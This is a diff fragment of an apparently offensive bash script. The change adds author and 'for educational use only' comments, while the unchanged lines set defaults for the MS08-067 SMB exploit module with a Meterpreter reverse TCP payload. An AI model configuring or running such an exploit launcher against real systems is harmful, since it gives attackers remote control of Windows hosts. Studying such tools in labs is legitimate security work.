@@ -1,5 +1,8 @@
 #!/bin/bash
 
+#### created by @jgaudard
+#### for educational use only
+
 #default values set
 EXPLOIT="windows/smb/ms08_067_netapi"
 PAYLOAD="windows/meterpreter/reverse_tcp"
